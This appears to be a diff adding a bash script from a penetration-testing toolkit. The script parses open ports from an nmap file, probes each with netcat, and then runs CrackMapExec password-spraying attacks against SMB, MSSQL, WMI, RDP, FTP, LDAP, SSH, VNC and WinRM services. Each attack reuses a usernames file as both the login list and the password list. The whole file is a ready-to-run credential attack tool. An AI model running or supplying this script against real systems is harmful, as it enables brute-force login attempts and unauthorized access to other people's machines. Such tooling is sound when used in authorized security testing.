@@ -1,0 +1,92 @@
+#!/bin/bash
+
+# This script executes quick spray attacks for open ports for access.
+# Usage: qview nmap/init.nmap
+
+# Define $RHOST enviornment for target IP address, default to "127.0.0.1"
+TARGET_HOST="${RHOST:-127.0.0.1}"
+
+# Use the first command line argument as the port file, default to "nmap/all.nmap"
+PORT_FILE=$1
+
+echo $PORT_FILE
+
+# Check if the port file exists
+if [ ! -f "$PORT_FILE" ]; then
+    echo "Nmap scan file not found: $PORT_FILE"
+    echo "Usage: qspray nmap/all.nmap"
+    exit 1
+fi
+
+# Create an array using a for loop
+PORTS_ARRAY=()
+while IFS= read -r line; do
+    # Extract numbers from the line
+    for PORT in $(echo "$line" | grep -oE '\b[0-9]+\b'); do
+        PORTS_ARRAY+=("$PORT")
+    done
+done < <(grep -oP '\b[0-9]+(?=/(tcp|udp))\b' $PORT_FILE | sort -n | uniq -c | awk '{print $2}')
+
+# Print the elements of PORTS_ARRAY
+echo "Printing the elements of PORTS_ARRAY:"
+for PORT in "${PORTS_ARRAY[@]}"; do
+    echo "$PORT"
+done
+
+# Password spraying
+
+echo "Checking ports on $TARGET_HOST..."
+
+for PORT in "${PORTS_ARRAY[@]}"; do
+    # Use netcat to check if the port is open
+    nc -zv -w 2 "$TARGET_HOST" "$PORT" >/dev/null 2>&1
+
+    # Check the exit status of netcat
+    if [ $? -eq 0 ]; then
+        echo "Port $PORT is open"
+
+        # Run CME based on the open port
+        case $PORT in
+            139 | 445)
+                echo "Running CME for SMB..."
+                cme smb "$TARGET_HOST" -u usernames.txt -p usernames.txt --continue-on-success
+                ;;
+            1433)
+                echo "Running CME for MSSQL..."
+                cme mssql "$TARGET_HOST" -u usernames.txt -p usernames.txt --continue-on-success
+                ;;
+            135)
+                echo "Running CME for WMI..."
+                cme wmi "$TARGET_HOST" -u usernames.txt -p usernames.txt --continue-on-success
+                ;;
+            3389)
+                echo "Running CME for RDP..."
+                cme rdp "$TARGET_HOST" -u usernames.txt -p usernames.txt --continue-on-success
+                ;;
+            21)
+                echo "Running CME for FTP..."
+                cme ftp "$TARGET_HOST" -u usernames.txt -p usernames.txt --continue-on-success
+                ;;
+            389)
+                echo "Running CME for LDAP..."
+                cme ldap "$TARGET_HOST" -u usernames.txt -p usernames.txt --continue-on-success    
+                ;;
+            22)
+                echo "Running CME for SSH..."
+                cme ssh "$TARGET_HOST" -u usernames.txt -p usernames.txt --continue-on-success
+                ;;
+            5900)
+                echo "Running CME for VNC..."
+                cme vnc "$TARGET_HOST" -u usernames.txt -p usernames.txt --continue-on-success
+                ;;
+            5985)
+                echo "Running CME for WinRM..."
+                cme winrm "$TARGET_HOST" -u usernames.txt -p usernames.txt --continue-on-success
+                ;;
+        esac
+    else
+        echo "Port $PORT is closed"
+    fi
+done
+
+echo "CME scans complete."
